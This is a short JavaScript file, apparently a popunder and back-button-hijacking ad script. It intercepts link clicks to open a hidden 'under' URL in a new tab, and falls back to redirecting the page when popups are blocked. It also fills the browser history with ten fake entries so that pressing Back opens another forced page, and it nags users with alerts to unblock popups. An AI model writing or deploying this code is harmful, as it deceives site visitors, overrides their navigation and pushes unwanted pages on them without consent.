if (typeof under !== "undefined" && under !== null) {
  if (typeof cta !== "undefined" && cta !== null) {
    document.addEventListener('click', function (event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A' && target.classList.contains(cta)) {
          const linkHref = target.href;
          event.preventDefault();
          window.open(linkHref, '_self');
          openUnderPage(under);
          break;
        }
        target = target.parentNode;
      }
    });
  } else {
    document.addEventListener('click', function (event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A') {
          const linkHref = target.href;
          event.preventDefault();
          window.open(linkHref, '_self');
          openUnderPage(under);
          break;
        }
        target = target.parentNode;
      }
    });
  }
}

let backAttempted = false;

if (typeof back !== "undefined" && back !== null) {
  !(function () {
    var t;
    try {
      const URL = window.location.href.split(/[#]/)[0];
      for (t = 0; t < 10; ++t) history.pushState({}, '', URL + '#');
      onpopstate = function (event) {
        event.state && openBackPage(back);
      };
    } catch (o) {
      console.log(o);
    }
  })();
}

function openUnderPage(under) {
  const newWindow = window.open(under, '_blank');
  if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
    // Popup blocked, show a dialogue box
    alert('The new tab was blocked by a popup blocker. Please allow popups for this website.');
    window.top.location.href = under;
  }
}

function openBackPage(back) {
  if (!backAttempted) {
    backAttempted = true;
    const newWindow = window.open(back, '_blank');
    if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
      // Popup blocked, show a dialogue box
      alert('Click on the blocked link, then you can go back :P');
      setTimeout(function () {
        backAttempted = false;
      }, 100); // Reset backAttempted after 100 milliseconds
    }
  } else {
    window.top.location.href = back;
  }
}
